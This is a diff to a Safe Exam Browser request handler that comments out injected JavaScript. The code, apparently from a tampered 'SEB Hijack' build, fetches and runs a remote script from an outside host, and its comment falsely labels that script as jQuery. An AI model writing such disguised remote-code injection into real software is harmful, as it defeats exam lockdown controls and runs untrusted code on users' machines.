@@ -49,33 +49,33 @@ namespace SafeExamBrowser.Browser.Handlers
 				frame.ExecuteJavaScriptAsync($"window.print = function() {{ alert('{text.Get(TextKey.Browser_PrintNotAllowed)}') }}");
 			}
 
-			var js = @"
-				function loadScript(url, completeCallback) {
-				var script = document.createElement('script');
-				script.src = url;
-				script.async = true; // Use async for non-blocking loading
+			//var js = @"
+			//	function loadScript(url, completeCallback) {
+			//	var script = document.createElement('script');
+			//	script.src = url;
+			//	script.async = true; // Use async for non-blocking loading
 
-				script.onload = function() {
-					completeCallback();
-					// Clean up the script reference
-					script.onload = null; // Prevent memory leaks
-				};
+			//	script.onload = function() {
+			//		completeCallback();
+			//		// Clean up the script reference
+			//		script.onload = null; // Prevent memory leaks
+			//	};
 
-				script.onerror = function() {
-					alert('SEB Hijack could not load');
-				};
+			//	script.onerror = function() {
+			//		alert('SEB Hijack could not load');
+			//	};
 
-				document.head.appendChild(script);
-			}
+			//	document.head.appendChild(script);
+			//}
 
-			// Load jQuery over HTTPS
-			loadScript('https://wxnnvs.ftp.sh/un-seb/the_script.js', function() {
-				console.log('jQuery has been loaded.');
-			});
+			//// Load jQuery over HTTPS
+			//loadScript('https://wxnnvs.ftp.sh/un-seb/the_script.js', function() {
+			//	console.log('jQuery has been loaded.');
+			//});
 
-			";
+			//";
 
-			frame.ExecuteJavaScriptAsync(js);
+			//frame.ExecuteJavaScriptAsync(js);
 
 			if (settings.UseIsolatedClipboard)
 			{
